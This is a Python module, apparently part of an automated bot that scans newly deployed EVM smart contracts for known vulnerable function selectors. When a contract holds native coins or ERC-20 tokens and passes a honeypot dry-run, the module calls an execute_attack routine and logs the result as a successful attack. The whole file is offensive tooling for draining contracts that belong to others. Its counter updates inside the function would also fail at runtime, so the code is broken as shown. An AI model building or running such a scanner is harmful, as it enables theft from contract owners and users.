# core/analyzer.py
import asyncio

from utils.logger import log_info
from config.settings import VULNERABLE_SIGNATURES, MIN_NATIVE_BALANCE
from core.balance_checker import get_native_balance, get_all_token_balances
from core.honeypot_detector import simulate_dry_run
from core.attack_executor import execute_attack
from utils.evm_utils import get_storage_at, is_eoa
from core.initcode_simulator import simulate_initcode
from core.stats import checked_contracts, vulnerable_found, successful_attacks

def extract_4byte_selectors(bytecode: str) -> list:
    selectors = []
    for i in range(0, len(bytecode) - 8, 2):
        if bytecode[i:i+2] in ("60", "63"):
            selector = bytecode[i+2:i+10]
            if len(selector) == 8:
                selectors.append(selector.lower())
    return list(set(selectors))

async def analyze_contract(network, tx_hash, init_code, contract_address, sender):
    checked_contracts += 1
    log_info(f"[{network}] 🔍 Анализ TX {tx_hash[:10]}... | Контракт: {contract_address}")

    # Эвристика по initCode до деплоя
    initcode_result = simulate_initcode(init_code)
    if not initcode_result["ok"]:
        log_info(f"[{network}] ❌ Нет сигнатур уязвимостей до деплоя — пропуск")
        return

    bytecode = init_code[2:] if init_code.startswith("0x") else init_code
    found_selectors = extract_4byte_selectors(bytecode)

    matched = []
    for selector in found_selectors:
        for vuln_name, vuln_sigs in VULNERABLE_SIGNATURES.items():
            if selector in vuln_sigs:
                matched.append((vuln_name, selector))

    if not matched:
        log_info(f"[{network}] ❌ Нет уязвимостей в: {contract_address}")
        return

    vulnerable_found += 1
    log_info(f"[{network}] ⚠️ Найдены уязвимости: {matched}")

    # Проверка баланса нативки
    balance = await get_native_balance(contract_address, network)

    # Проверка ERC-20 балансов
    erc20_balances = await get_all_token_balances(contract_address, network)

    if balance < MIN_NATIVE_BALANCE and not erc20_balances:
        log_info(f"[{network}] 🚫 Контракт пуст — ни нативки, ни токенов")
        return

    log_info(f"[{network}] 💰 Баланс нативки: {balance:.5f} {network.upper()}")
    if erc20_balances:
        log_info(f"[{network}] 💰 ERC-20 балансы: {erc20_balances}")

    # Проверка storage 0
    slot0 = await get_storage_at(network, contract_address, 0)
    log_info(f"[{network}] 🧬 Slot[0]: {slot0}")

    # Проверка, что sender — EOA
    eoa_check = await is_eoa(network, sender)
    log_info(f"[{network}] 👤 Sender {sender[:8]}... is {'EOA' if eoa_check else 'Contract'}")

    # Honeypot dry-run
    fake_data = "0x"
    ok = await simulate_dry_run(network, sender, contract_address, fake_data)
    if not ok:
        log_info(f"[{network}] 🧱 Honeypot — отклонено")
        return

    # Выбор способа атаки
    matched_sigs = [selector for _, selector in matched]
    use_upgrade_and_call = "f851a440" in matched_sigs

    log_info(f"[{network}] ✅ Контракт готов к атаке — начинаем execute_attack")

    await execute_attack(
        network=network,
        contract_address=contract_address,
        tx_hash=tx_hash,
        use_upgrade_and_call=use_upgrade_and_call
    )

    successful_attacks += 1

